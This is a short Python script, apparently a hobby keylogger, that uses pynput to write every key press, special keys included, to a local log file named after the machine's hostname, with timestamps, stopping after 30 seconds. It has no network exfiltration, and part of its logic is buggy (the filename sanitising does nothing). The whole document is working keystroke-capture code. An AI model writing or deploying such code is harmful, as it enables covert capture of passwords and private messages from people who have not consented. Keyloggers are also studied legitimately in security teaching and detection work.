import socket
from pynput.keyboard import Key, Listener
from datetime import datetime, timedelta

#to prevent infinite wait time (can be changed)
die = datetime.now()+timedelta(seconds=30)

dev_name = socket.gethostname() #for naming te log file
for _ in dev_name: #to prevent unnecessary filename related errors
    if _ == '\ / : * ? " < > |':
        dev_name.replace(_,"_")

#timestamp and partition for better viewing and analysis
logfile = open("{0}_KEYLOG.txt".format(dev_name),"a")
logfile.write("\n\n--------------------------------------------------------------------------------------------------------------------------------------------------------------\n")
logfile.write(datetime.now().strftime("%d/%m/%Y %H:%M:%S")+"\n\n")
logfile.close()

def on_press(key): 
    if datetime.now() >= die: #keylogger stops
        return False
    
    logfile = open("{0}_KEYLOG.txt".format(dev_name),"a")
    try:
        logfile.write("{0}".format(key.char)) #recording every key press
    except AttributeError:
        logfile.write(" [{0}] ".format(key.name)) #recording special keys also
    logfile.close()

def on_release(key):
    logfile = open("{0}_KEYLOG.txt".format(dev_name),"a")
    if key == Key.enter: #for better viewing 
        logfile.write("\n")
    logfile.close()
    if datetime.now() >= die: #keylogger stops
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() #initializing the script

listener = Listener(on_press=on_press, on_release=on_release)
listener.start() #starts the keylogger

#status of keylogger and its log file name for viewing
print("Logging has now been stopped. File:{0}".format(f"{dev_name}_KEYLOG.txt")) 
